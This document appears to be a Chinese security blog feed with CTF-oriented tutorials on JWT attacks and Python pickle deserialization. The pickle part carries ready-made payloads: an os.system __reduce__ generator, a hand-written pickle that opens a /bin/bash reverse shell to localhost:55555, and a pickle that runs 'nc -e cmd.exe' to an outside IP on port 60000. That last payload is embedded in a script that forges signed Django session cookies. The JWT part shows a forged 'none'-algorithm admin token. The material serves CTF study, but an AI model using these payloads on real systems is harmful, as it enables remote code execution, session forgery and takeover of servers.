title="header部分"></a>header部分</h3><p>header部分最常用的两个字段是<code>alg</code>和<code>typ</code>，<code>alg</code>指定了token加密使用的算法（最常用的为<em>HMAC</em>和<em>RSA</em>算法），typ`声明类型为JWT</p><p>header通常会长这个样子：</p><pre><code>{        &quot;alg&quot; : &quot;HS256&quot;,        &quot;typ&quot; : &quot;jwt&quot;}</code></pre><h3 id="payload部分"><a href="#payload部分" class="headerlink" title="payload部分"></a>payload部分</h3><p>payload则为用户数据以及一些元数据有关的声明，用以声明权限，举个例子，一次登录的过程可能会传递以下数据</p><pre><code>{        &quot;user_role&quot; : &quot;finn&quot;,    //当前登录用户    &quot;iss&quot;: &quot;admin&quot;,          //该JWT的签发者    &quot;iat&quot;: 1573440582,        //签发时间    &quot;exp&quot;: 1573940267,        //过期时间    &quot;nbf&quot;: 1573440582,         //该时间之前不接收处理该Token    &quot;domain&quot;: &quot;example.com&quot;,   //面向的用户    &quot;jti&quot;: &quot;dff4214121e83057655e10bd9751d657&quot;   //Token唯一标识}</code></pre><h3 id="signature部分"><a href="#signature部分" class="headerlink" title="signature部分"></a>signature部分</h3><p>signature的功能是保护token完整性。</p><p>生成方法为将header和payload两个部分联结起来，然后通过header部分指定的算法，计算出签名。</p><p>抽象成公式就是</p><pre><code>signature = HMAC-SHA256(base64urlEncode(header) + &#39;.&#39; + base64urlEncode(payload), secret_key)</code></pre><p>值得注意的是，编码header和payload时使用的编码方式为<code>base64urlencode</code>，<code>base64url</code>编码是<code>base64</code>的修改版，为了方便在网络中传输使用了不同的编码表，它不会在末尾填充”=”号，并将标准Base64中的”+”和”/“分别改成了”-“和”-“。</p><h3 id="完整token生成"><a href="#完整token生成" class="headerlink" title="完整token生成"></a>完整token生成</h3><p>一个完整的jwt格式为(<code>header</code>.<code>payload</code>.<code>signature</code>)，其中header、payload使用base64url编码，signature通过指定算法生成。</p><p>python的<code>Pyjwt</code>使用示例如下</p><pre><code>import jwtencoded_jwt = jwt.encode({&#39;user_name&#39;: &#39;admin&#39;}, &#39;key&#39;, algorithm=&#39;HS256&#39;)print(encoded_jwt)print(jwt.decode(encoded_jwt, &#39;key&#39;, algorithms=[&#39;HS256&#39;]))</code></pre><p>生成的token为</p><pre><code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`.`eyJ1c2VyX25hbWUiOiJhZG1pbiJ9.oL5szC7mFoJ_7FI9UVMcKfmisqr6Qlo1dusps5wOUlo</code></pre><h2 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h2><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><h4 id="空加密算法"><a href="#空加密算法" class="headerlink" title="空加密算法"></a>空加密算法</h4><p>JWT支持使用空加密算法，可以在header中指定alg为<code>None</code></p><p>这样的话，只要把signature设置为空（即不添加signature字段），提交到服务器，任何token都可以通过服务器的验证。举个例子，使用以下的字段</p><pre><code>{    &quot;alg&quot; : &quot;None&quot;,    &quot;typ&quot; : &quot;jwt&quot;}{    &quot;user&quot; : &quot;Admin&quot;}</code></pre><p>生成的完整token为<code>ew0KCSJhbGciIDogIk5vbmUiLA0KCSJ0eXAiIDogImp3dCINCn0.ew0KCSJ1c2VyIiA6ICJBZG1pbiINCn0</code></p><p>(header+’.’+payload，去掉了’.’+signature字段)</p><p>空加密算法的设计初衷是用于调试的，但是如果某天开发人员脑阔瓦特了，在生产环境中开启了空加密算法，缺少签名算法，jwt保证信息不被篡改的功能就失效了。攻击者只需要把alg字段设置为None，就可以在payload中构造身份信息，伪造用户身份。</p><h4 id="修改RSA加密算法为HMAC"><a href="#修改RSA加密算法为HMAC" class="headerlink" title="修改RSA加密算法为HMAC"></a>修改RSA加密算法为HMAC</h4><h3 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h3><p>工具 <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener">c-jwt-cracker</a> </p><p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="https://explorersss.github.io/2019/12/19/jwt攻击方式/">https://explorersss.github.io/2019/12/19/jwt攻击方式/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python  pickle 入门</title>
      <link href="/2019/12/16/pickle/"/>
      <url>/2019/12/16/pickle/</url>
      
        <content type="html"><![CDATA[<h1 id="python-pickle"><a href="#python-pickle" class="headerlink" title="python pickle"></a>python pickle</h1><h2 id="推荐文章"><a href="#推荐文章" class="headerlink" title="推荐文章"></a>推荐文章</h2><p> <a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p><p>z牛: <a href="https://www.anquanke.com/post/id/188981" target="_blank" rel="noopener">https://www.anquanke.com/post/id/188981</a> </p><h2 id="pickle操作码大全-v0"><a href="#pickle操作码大全-v0" class="headerlink" title="pickle操作码大全(v0)"></a>pickle操作码大全(v0)</h2><p>有啥不懂的直接看源码把(z牛)</p><pre><code class="python">MARK           = b&#39;(&#39;   # push special markobject on stackSTOP           = b&#39;.&#39;   # every pickle ends with STOPPOP            = b&#39;0&#39;   # discard topmost stack itemPOP_MARK       = b&#39;1&#39;   # discard stack top through topmost markobjectDUP            = b&#39;2&#39;   # duplicate top stack itemFLOAT          = b&#39;F&#39;   # push float object; decimal string argumentINT            = b&#39;I&#39;   # push integer or bool; decimal string argumentBININT         = b&#39;J&#39;   # push four-byte signed intBININT1        = b&#39;K&#39;   # push 1-byte unsigned intLONG           = b&#39;L&#39;   # push long; decimal string argumentBININT2        = b&#39;M&#39;   # push 2-byte unsigned intNONE           = b&#39;N&#39;   # push NonePERSID         = b&#39;P&#39;   # push persistent object; id is taken from string argBINPERSID      = b&#39;Q&#39;   #  &quot;       &quot;         &quot;  ;  &quot;  &quot;   &quot;     &quot;  stackREDUCE         = b&#39;R&#39;   # apply callable to argtuple, both on stackSTRING         = b&#39;S&#39;   # push string; NL-terminated string argumentBINSTRING      = b&#39;T&#39;   # push string; counted binary string argumentSHORT_BINSTRING= b&#39;U&#39;   #  &quot;     &quot;   ;    &quot;      &quot;       &quot;      &quot; &lt; 256 bytesUNICODE        = b&#39;V&#39;   # push Unicode string; raw-unicode-escaped&#39;d argumentBINUNICODE     = b&#39;X&#39;   #   &quot;     &quot;       &quot;  ; counted UTF-8 string argumentAPPEND         = b&#39;a&#39;   # append stack top to list below itBUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()GLOBAL         = b&#39;c&#39;   # push self.find_class(modname, name); 2 string argsDICT           = b&#39;d&#39;   # build a dict from stack itemsEMPTY_DICT     = b&#39;}&#39;   # push empty dictAPPENDS        = b&#39;e&#39;   # extend list on stack by topmost stack sliceGET            = b&#39;g&#39;   # push item from memo on stack; index is string argBINGET         = b&#39;h&#39;   #   &quot;    &quot;    &quot;    &quot;   &quot;   &quot;  ;   &quot;    &quot; 1-byte argINST           = b&#39;i&#39;   # build &amp; push class instanceLONG_BINGET    = b&#39;j&#39;   # push item from memo on stack; index is 4-byte argLIST           = b&#39;l&#39;   # build list from topmost stack itemsEMPTY_LIST     = b&#39;]&#39;   # push empty listOBJ            = b&#39;o&#39;   # build &amp; push class instancePUT            = b&#39;p&#39;   # store stack top in memo; index is string argBINPUT         = b&#39;q&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 1-byte argLONG_BINPUT    = b&#39;r&#39;   #   &quot;     &quot;    &quot;   &quot;   &quot; ;   &quot;    &quot; 4-byte argSETITEM        = b&#39;s&#39;   # add key+value pair to dictTUPLE          = b&#39;t&#39;   # build tuple from topmost stack itemsEMPTY_TUPLE    = b&#39;)&#39;   # push empty tupleSETITEMS       = b&#39;u&#39;   # modify dict by adding topmost key+value pairsBINFLOAT       = b&#39;G&#39;   # push float; arg is 8-byte float encodingTRUE           = b&#39;I01\n&#39;  # not an opcode; see INT docs in pickletools.pyFALSE          = b&#39;I00\n&#39;  # not an opcode; see INT docs in pickletools.py</code></pre><h2 id="pickle介绍"><a href="#pickle介绍" class="headerlink" title="pickle介绍"></a>pickle介绍</h2><h3 id="pickle的大致过程"><a href="#pickle的大致过程" class="headerlink" title="pickle的大致过程"></a>pickle的大致过程</h3><p>以Foo类为例</p><ol><li>提取出Foo类中的所有attribute(从<code>__dict__</code>中获得)将其转化为键值对</li><li>写入对象类名</li><li>写入第一步生成的键值对</li></ol><h3 id="unpickle的大致过程"><a href="#unpickle的大致过程" class="headerlink" title="unpickle的大致过程"></a>unpickle的大致过程</h3><ol><li>获取pickle流</li><li>重新构建属性列表</li><li>根据保存的类名来创建对象</li><li>将属性列表恢复到对象中</li></ol><h3 id="pvm组成-解析pickle"><a href="#pvm组成-解析pickle" class="headerlink" title="pvm组成(解析pickle)"></a>pvm组成(解析pickle)</h3><ol><li>指令解释器<br>最后一步一定是返回栈顶元素</li><li>栈 </li><li>memo(临时保存数据)<br>用类似list的方式来读取和储存数据,以字典方式实现<br>如p100,意为把栈顶元素保存到memo中索引为100</li></ol><h3 id="pvm指令格式"><a href="#pvm指令格式" class="headerlink" title="pvm指令格式"></a>pvm指令格式</h3><ol><li><p>pvm的操作码只有一个字节</p></li><li><p>需要参数的操作码,要在每一个参数后面加上换行符</p></li><li><p>从pickle流中读取数据,并加载到栈上</p></li></ol><h2 id="如何生成pickle"><a href="#如何生成pickle" class="headerlink" title="如何生成pickle"></a>如何生成pickle</h2><h3 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h3><h4 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h4><table><thead><tr><th>操作码</th><th>助记</th><th>加载到栈上的数据类型</th><th>示例</th></tr></thead><tbody><tr><td>S</td><td>string</td><td>String</td><td>S’foo’\n</td></tr><tr><td>V</td><td>unicode</td><td>unicode</td><td>Vfo\u006f\n</td></tr><tr><td>I</td><td>int</td><td>int</td><td>I42\n</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="修改栈-memo"><a href="#修改栈-memo" class="headerlink" title="修改栈/memo"></a>修改栈/memo</h4><table><thead><tr><th>操作码</th><th>助记</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>(</td><td>MARK</td><td>向栈中加入一个标记</td><td>(</td></tr><tr><td>0</td><td>POP</td><td>弹出栈顶元素并丢弃</td><td>0</td></tr><tr><td>p<code>&lt;memo_index&gt;</code>\n</td><td>PUT</td><td>复制栈顶元素到memo中</td><td>p101\n</td></tr><tr><td>g<code>&lt;memo_index&gt;</code>\n</td><td>GET</td><td>将memo中指定元素拷贝到栈顶</td><td>g101\n</td></tr></tbody></table><h4 id="生成-修改列表-字典-元组"><a href="#生成-修改列表-字典-元组" class="headerlink" title="生成/修改列表,字典,元组"></a>生成/修改列表,字典,元组</h4><table><thead><tr><th>操作码</th><th>助记</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>l</td><td>列表</td><td>将栈顶到遇到的第一个mask之间的元素到一个列表,并将这个列表放入栈中</td><td>(S’string’\nl</td></tr><tr><td>t</td><td>元组</td><td>将栈顶到遇到的第一个mask之间的元素放到一个元组中,并将这个元组放入栈中</td><td>(S’string’\nS’string2’\nt</td></tr><tr><td>d</td><td>字典</td><td>将栈顶到遇到的第一个mask之间的元素放到一个字典中,并将这个字典放入栈中</td><td>(S’key1’\nS’value1’\nS’key2’\nS’value2’\nd</td></tr><tr><td>s</td><td>SETITEM</td><td>从栈出弹出三个值:字典,键,值,将键值对合并到字典中</td><td>(S’key1’\nS’val1’\nS’key2’\nI123\ndS’key3’\nS’val 3’\ns</td></tr><tr><td></td><td></td><td></td><td></td></tr></tbody></table><h4 id="pickle-流生成元组的过程"><a href="#pickle-流生成元组的过程" class="headerlink" title="pickle 流生成元组的过程"></a>pickle 流生成元组的过程</h4><ul><li><p>生成元组的指令</p><pre><code>(S&#39;str1&#39;S&#39;str2&#39;I1234t</code></pre></li><li><p>生成元组的过程图</p></li></ul><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vcyoggx7j310z0fs74s.jpg" alt="image5192"></p><h4 id="加载对象"><a href="#加载对象" class="headerlink" title="加载对象"></a>加载对象</h4><table><thead><tr><th>操作码</th><th>助记</th><th>描述</th><th>示例</th></tr></thead><tbody><tr><td>c</td><td>GLOBAL</td><td>需要两个参数(module,class)来创建对象,并将其放到栈中</td><td>cos\nsystem\n</td></tr><tr><td>R</td><td>REDUCE</td><td>弹出一个参数元组和一个可调用对象（可能是由GLOBAL加载的），将参数应用于可调用对象并将结果压入栈中</td><td>cos\nsystem\n(S’sleep 10’\ntR</td></tr></tbody></table><h4 id="加载对象过程图"><a href="#加载对象过程图" class="headerlink" title="加载对象过程图"></a>加载对象过程图</h4><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebew5nvj312p0j8jto.jpg" alt="image5725"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebmas4ij31350k30v4.jpg" alt="image5808"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vebufeq6j313g0mfq6a.jpg" alt="image5889"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec1wavgj312r0i3tb6.jpg" alt="image5970"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9vec9lsjpj31350iggo8.jpg" alt="image6051"></p><p><img src="https://ws1.sinaimg.cn/large/006pWR9aly1g9ved0gxklj31490l7q6n.jpg" alt="image6132"></p><h2 id="编写pickle的一些技巧"><a href="#编写pickle的一些技巧" class="headerlink" title="编写pickle的一些技巧"></a>编写pickle的一些技巧</h2><p>我们如何执行如下的代码:</p><pre><code class="python">f=open(&#39;/path/to/massive/sikrit&#39;) f.read()</code></pre><p>思路是:首先执行open函数,将其储存在memo里面,在利用魔术方法来执行f.read()</p><p><code>f.read()</code>可以等价替换成<code>__builtin__.apply( __builtin__.getattr(file,&#39;read&#39;), [f])</code></p><p>最后合成的pickle是</p><pre><code>#step1c__builtin__open(S&#39;/path/to/massive/sikrit&#39;tRp100#step2c__builtin__apply(c__builtin__getattr(c__builtin__fileS&#39;read&#39;tR(g100ltR.</code></pre><h3 id="手写pickle模板"><a href="#手写pickle模板" class="headerlink" title="手写pickle模板"></a>手写pickle模板</h3><p><img src="https://ws1.sinaimg.cn/large/006pWR9agy1g9xumsbi3oj30qg0hoad6.jpg" alt="image6628"></p><h3 id="利用-reduce-来生成pickle代码"><a href="#利用-reduce-来生成pickle代码" class="headerlink" title="利用__reduce__来生成pickle代码"></a>利用<code>__reduce__</code>来生成pickle代码</h3><p><code>__reduce__</code></p><blockquote><p>当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。 </p></blockquote><pre><code class="python">import os, pickleclass Test(object):    def __reduce__(self):        return (os.system,(&#39;ls&#39;,))print(pickle.dumps(Test(), protocol=0))</code></pre><h3 id="利用marshal和cPickle来生成代码"><a href="#利用marshal和cPickle来生成代码" class="headerlink" title="利用marshal和cPickle来生成代码"></a>利用marshal和cPickle来生成代码</h3><pre><code class="python"># !/usr/bin/env python# -*- coding:utf-8 -*-__author__ = &#39;bit4&#39;__github__ = &#39;https://github.com/bit4woo&#39;import marshalimport base64import cPickleimport urllibimport pickledef foo():#you should write your code in this function    import os    def fib(n):        if n &lt;= 1:            return n        return fib(n-1) + fib(n-2)    print &#39;fib(10) =&#39;, fib(10)    os.system(&#39;dir&#39;)code_serialized = base64.b64encode(marshal.dumps(foo.func_code))#为了保证code_serialized中的内容得到执行，我们需要如下代码#(types.FunctionType(marshal.loads(base64.b64decode(code_serialized)), globals(), &#39;&#39;))()payload =  &quot;&quot;&quot;ctypesFunctionType(cmarshalloads(cbase64b64decode(S&#39;%s&#39;tRtRc__builtin__globals(tRS&#39;&#39;tR(tR.&quot;&quot;&quot; % base64.b64encode(marshal.dumps(foo.func_code))print(payload)</code></pre><h2 id="经验"><a href="#经验" class="headerlink" title="经验"></a>经验</h2><h3 id="通过源码查看pickle的方法"><a href="#通过源码查看pickle的方法" class="headerlink" title="通过源码查看pickle的方法"></a>通过源码查看pickle的方法</h3><p>直接所有操作码对应的变量</p><p><img src="https://i.loli.net/2019/12/23/pWlFyYPKB7enMQE.png" alt="image7895"></p><p><code>dispatch[BININT1[0]] = load_binint1</code></p><p>找到类似这种的后面的就是对应的函数</p><h2 id="pickle工具"><a href="#pickle工具" class="headerlink" title="pickle工具"></a>pickle工具</h2><p> <a href="https://github.com/sensepost/anapickle" target="_blank" rel="noopener">converttopickle.py</a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p> <a href="https://github.com/sensepost/anapickle/blob/master/anapickle.py" target="_blank" rel="noopener">https://github.com/sensepost/anapickle/blob/master/anapickle.py</a> </p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><pre><code class="python">&#39;&#39;&#39;csocket\n__dict__\np101\n0c__builtin__\ngetattr\n(g101\nS&#39;__getitem__&#39;\ntRp102\n0g102\n(S&#39;AF_INET&#39;\ntRp100\n0csocket\n__dict__\np104\n0c__builtin__\ngetattr\n(g104\nS&#39;__getitem__&#39;\ntRp105\n0g105\n(S&#39;SOCK_STREAM&#39;\ntRp103\n0csocket\n__dict__\np107\n0c__builtin__\ngetattr\n(g107\nS&#39;__getitem__&#39;\ntRp108\n0g108\n(S&#39;IPPROTO_TCP&#39;\ntRp106\n0csocket\n__dict__\np110\n0c__builtin__\ngetattr\n(g110\nS&#39;__getitem__&#39;\ntRp111\n0g111\n(S&#39;SOL_SOCKET&#39;\ntRp109\n0csocket\n__dict__\np113\n0c__builtin__\ngetattr\n(g113\nS&#39;__getitem__&#39;\ntRp114\n0g114\n(S&#39;SO_REUSEADDR&#39;\ntRp112\n0csocket\nsocket\n(g100\ng103\ng106\ntRp115\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;setsockopt&#39;\ntRp116\n0c__builtin__\napply\n(g116\n(g115\ng109\ng112\nI1\nltRp117\n0c__builtin__\ngetattr\n(csocket\nsocket\nS&#39;connect&#39;\ntRp118\n0c__builtin__\napply\n(g118\n(g115\n(S&#39;localhost&#39;\nI55555\ntltRp119\n0c__builtin__\ngetattr\n(csocket\n_socketobject\nS&#39;fileno&#39;\ntRp120\n0c__builtin__\napply\n(g120\n(g115\nltRp121\n0c__builtin__\nint\n(g121\ntRp122\n0csubprocess\nPopen\n((S&#39;/bin/bash&#39;\ntI0\nS&#39;/bin/bash&#39;\ng122\ng122\ng122\ntRp123\n0S&#39;finished&#39;\n.&#39;&#39;&#39;</code></pre><p>localhost:55555</p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><ol><li>使用v0版的pickle协议,保证shellcode的通用性</li></ol><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="suctf-guess-game"><a href="#suctf-guess-game" class="headerlink" title="suctf guess_game"></a>suctf guess_game</h3><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Misc/guess_game" target="_blank" rel="noopener">题目链接</a></p><p>考点:pickle</p><p>代码审计一波后</p><p>如果猜对10次后会给flag(机会只有10次)</p><p>因为知道是考pickle直接全局搜索pickle发现在server处有</p><p><code>ticket = restricted_loads(ticket)</code></p><p>其中ticket是我们可控点</p><p>跟进去看</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    def find_class(self, module, name):        # Only allow safe classes        if &quot;guess_game&quot; == module[0:10] and &quot;__&quot; not in name:            return getattr(sys.modules[module], name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; % (module, name))def restricted_loads(s):    &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot;    return RestrictedUnpickler(io.BytesIO(s)).load()</code></pre><p>我们只能加载guess_game中的类,并且不能调用魔术方法.</p><p>在这一题中拿到flag有两种方式:</p><ol><li>命令执行</li><li>通过游戏</li></ol><p>在怼着find_class许久之后发现没办法绕过,于是只能走通过游戏这一条路了</p><p>而游戏中判定赢的条件是</p><pre><code class="python">class Game    def is_win(self):        return self.win_count == max_round</code></pre><p>如果我们能直接修改win_count或者max_round就可以拿到flag了</p><p>我们发现在<code>guess_game</code>中已经有一个<code>game = Game()</code>这个了,也就是我们可以利用pickle来加载这个game直接修改</p><p>那么接下来就是如何修改了</p><p>在pickle的操作码中我们发现</p><p><code>BUILD          = b&#39;b&#39;   # call __setstate__ or __dict__.update()</code>这一条</p><p>其中update()就可以修改game的属性了</p><p>那么接下来就只有一个问题了,操作码<code>b</code>如何使用</p><p>一路跟踪发现b操作码的实现</p><pre><code class="python">    def load_build(self):        stack = self.stack        state = stack.pop()        inst = stack[-1]        setstate = getattr(inst, &quot;__setstate__&quot;, None)        if setstate is not None:            setstate(state)            return        slotstate = None        if isinstance(state, tuple) and len(state) == 2:            state, slotstate = state        if state:            inst_dict = inst.__dict__            intern = sys.intern            for k, v in state.items():                if type(k) is str:                    inst_dict[intern(k)] = v                else:                    inst_dict[k] = v        if slotstate:            for k, v in slotstate.items():                setattr(inst, k, v)</code></pre><p>没有调用参数,栈顶应为字典,栈顶的下面是要修改的对象</p><p>最后的payload:</p><pre><code class="python">b&quot;cguess_game\ngame\n(S&#39;win_count&#39;\nI10\nS&#39;round_count&#39;\nI10\ndb\x80\x03cguess_game.Ticket\nTicket\nq\x00)\x81q\x01}q\x02X\x06\x00\x00\x00numberq\x03K\x01sb.&quot;</code></pre><h3 id="code-breaking-picklecode"><a href="#code-breaking-picklecode" class="headerlink" title="code breaking picklecode"></a>code breaking picklecode</h3><p><a href="https://github.com/phith0n/code-breaking/blob/master/2018/picklecode" target="_blank" rel="noopener">题目链接</a></p><p>代码审计发现在index处可以ssti</p><pre><code class="python">def index(request):    django_engine = engines[&#39;django&#39;]    template = django_engine.from_string(&#39;My name is &#39; + request.user.username)    return HttpResponse(template.render(None, request))</code></pre><p>但是django难以利用ssti命令执行但是能读取敏感配置</p><p>结合serializer.py</p><pre><code class="python">class RestrictedUnpickler(pickle.Unpickler):    blacklist = {&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}    def find_class(self, module, name):        # Only allow safe classes from builtins.        if module == &quot;builtins&quot; and name not in self.blacklist:            return getattr(builtins, name)        # Forbid everything else.        raise pickle.UnpicklingError(&quot;global &#39;%s.%s&#39; is forbidden&quot; %                                     (module, name))class PickleSerializer():    def dumps(self, obj):        return pickle.dumps(obj)    def loads(self, data):        try:            if isinstance(data, str):                raise TypeError(&quot;Can&#39;t load pickle from unicode string&quot;)            file = io.BytesIO(data)            return RestrictedUnpickler(file,                              encoding=&#39;ASCII&#39;, errors=&#39;strict&#39;).load()        except Exception as e:            return {}</code></pre><p>和setting文件里的特殊配置</p><pre><code class="python">SESSION_ENGINE = &#39;django.contrib.sessions.backends.signed_cookies&#39;SESSION_SERIALIZER = &#39;core.serializer.PickleSerializer&#39;</code></pre><p>查阅django文档发现</p><p> <a href="https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions" target="_blank" rel="noopener">https://docs.djangoproject.com/zh-hans/3.0/topics/http/sessions/#using-cookie-based-sessions</a> </p><p>可以确定,这里是通过读取secret_key来构造恶意cookie来pickle反序列化命令执行</p><p>我们跟进django.contrib.sessions.backends.signed_cookies来了解如何生成储存session的cookie(这里花了我很久的时间,从尝试看一步一步调试到看调用堆栈再到查文档最后才搞清楚过程,建议自己尝试)</p><p>在理解之后便有一下生成恶意cookie的代码</p><pre><code class="python">import base64import datetimeimport jsonimport reimport timeimport zlibimport picklefrom django.utils import baseconvfrom django.utils.crypto import constant_time_compare, salted_hmacfrom django.utils.encoding import force_bytesfrom django.utils.module_loading import import_stringfrom django import corefrom django.core import signingmyexp=b&#39;&#39;&#39;cbuiltinsglobals(tRp100cbuiltinsgetattrp101(g100S&#39;get&#39;tR(S&#39;builtins&#39;tRp103g101(g103S&#39;eval&#39;tR(S&#39;eval(\&#39;\&#39;\&#39;__import__(&#39;os&#39;).system(&#39;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#39;)\&#39;\&#39;\&#39;)&#39;tR.&#39;&#39;&#39;def pickle_exp(SECRET_KEY):    data = myexp    compress=True    # Flag for if it&#39;s been compressed or not    is_compressed = False    salt=&#39;django.contrib.sessions.backends.signed_cookies&#39;    if compress:        # Avoid zlib dependency unless compress is being used        compressed = zlib.compress(data)        if len(compressed) &lt; (len(data) - 1):            data = compressed            is_compressed = True    base64d = signing.b64_encode(data).decode()    if is_compressed:        base64d = &#39;.&#39; + base64d    print(signing.TimestampSigner(key=SECRET_KEY, salt=salt).sign(base64d))pickle_exp(&quot;asdasdasdasdas&quot;)</code></pre><p>接下来就是如何构造恶意的pickle代码的问题了</p><p>题目限制了只能加载builtins里的属性</p><p>且属性名不能为以下内容</p><pre><code>blacklist = {&#39;eval&#39;, &#39;exec&#39;, &#39;execfile&#39;, &#39;compile&#39;, &#39;open&#39;, &#39;input&#39;, &#39;__import__&#39;, &#39;exit&#39;}</code></pre><p>利用<code>__reduce__</code>来生成pickle代码已经无法满足要求了,我们不得不手写pickle代码,怎么手写就不详细讲了</p><p>我们现在把目光聚焦在如何构造利用链上</p><p>builtins的属性(删除部分)</p><pre><code class="python">[&#39;_&#39;, &#39;__build_class__&#39;, &#39;__debug__&#39;, &#39;__doc__&#39;, &#39;__import__&#39;, &#39;__loader__&#39;, &#39;__name__&#39;, &#39;__package__&#39;, &#39;__spec__&#39;, &#39;abs&#39;, &#39;all&#39;, &#39;any&#39;, &#39;ascii&#39;, &#39;bin&#39;, &#39;bool&#39;, &#39;breakpoint&#39;, &#39;bytearray&#39;, &#39;bytes&#39;, &#39;callable&#39;, &#39;chr&#39;, &#39;classmethod&#39;, &#39;compile&#39;, &#39;complex&#39;, &#39;copyright&#39;, &#39;credits&#39;, &#39;delattr&#39;, &#39;dict&#39;, &#39;dir&#39;, &#39;divmod&#39;, &#39;enumerate&#39;, &#39;eval&#39;, &#39;exec&#39;, &#39;exit&#39;, &#39;filter&#39;, &#39;float&#39;, &#39;format&#39;, &#39;frozenset&#39;, &#39;getattr&#39;, &#39;globals&#39;, &#39;hasattr&#39;, &#39;hash&#39;, &#39;help&#39;, &#39;hex&#39;, &#39;id&#39;, &#39;input&#39;, &#39;int&#39;, &#39;isinstance&#39;, &#39;issubclass&#39;, &#39;iter&#39;, &#39;len&#39;, &#39;license&#39;, &#39;list&#39;, &#39;locals&#39;, &#39;map&#39;, &#39;max&#39;, &#39;memoryview&#39;, &#39;min&#39;, &#39;next&#39;, &#39;object&#39;, &#39;oct&#39;, &#39;open&#39;, &#39;ord&#39;, &#39;pow&#39;, &#39;print&#39;, &#39;property&#39;, &#39;quit&#39;, &#39;range&#39;, &#39;repr&#39;, &#39;reversed&#39;, &#39;round&#39;, &#39;set&#39;, &#39;setattr&#39;, &#39;slice&#39;, &#39;sorted&#39;, &#39;staticmethod&#39;, &#39;str&#39;, &#39;sum&#39;, &#39;super&#39;, &#39;tuple&#39;, &#39;type&#39;, &#39;vars&#39;, &#39;zip&#39;]</code></pre><p>我们查看builtins的属性我们发现两个有意思的东西,一个是getattr,另一个是globals</p><p>虽然限制我们属性名不能为eval啥的,但是并没有限制不能出现在参数处</p><p>所以<code>getattr(builtins,&quot;eval&quot;)</code>便能得到eval方法了</p><p>但是看pickle的操作码并没有发现能直接导入一个模块的操作,在结合globals我们很容易想到<code>getattr(getattr(globals(),&quot;builtins&quot;),&quot;eval&quot;)</code></p><p>最后的payload:<code>builtins.getattr(builtins.getattr(builtins.globals(),&quot;builtins&quot;),&quot;eval&quot;)(&quot;evil code&quot;)</code></p><p>其对应的pickle代码是</p><pre><code class="python">b&#39;&#39;&#39;cbuiltinsglobals(tRp100cbuiltinsgetattrp101(g100S&#39;get&#39;tR(S&#39;builtins&#39;tRp103g101(g103S&#39;eval&#39;tR(S&#39;eval(\&#39;\&#39;\&#39;__import__(&#39;os&#39;).system(&#39;nc -e &quot;cmd.exe /K&quot; 39.108.164.219 60000 -d&#39;)\&#39;\&#39;\&#39;)&#39;tR.&#39;&#39;&#39;</code></pre><p>最后就差secret_key了,看别人的wp都是调试易得易得secret_key//</p><p>但是我是没找到,于是自己写了个过滤器</p><p>递归查找settings</p><pre><code class="python">from django.http.response import HttpResponse, HttpResponseRedirectfrom django.template import enginesfrom django.contrib.auth import login as auth_login, get_user_model, authenticatefrom django.contrib.auth.views import LoginView, logout_then_loginfrom django.contrib.auth.decorators import login_requiredfrom django.views import genericfrom django import templateimport djangofrom django import templateregister = template.Library()@register.filterdef get_dict(obj,way=&quot;&quot;,depth=0):    if depth&gt;11:        return     objdir=dir(obj)    r={&quot;dict&quot;:objdir,&quot;way&quot;:way}    result=&quot;&quot;    for i in objdir:                    try :            if &#39;_&#39; == i[0]:                continue            if getattr(obj, &#39;__module__&#39;, None)!=None and getattr(obj, &#39;__module__&#39;, None).split(&#39;.&#39;)[0] == django.__name__:                result+=get_dict(getattr(obj,i,None),way+&quot;.&quot;+i,depth+1)         except TypeError:            pass    if &quot;SECRET_KEY&quot; in objdir or 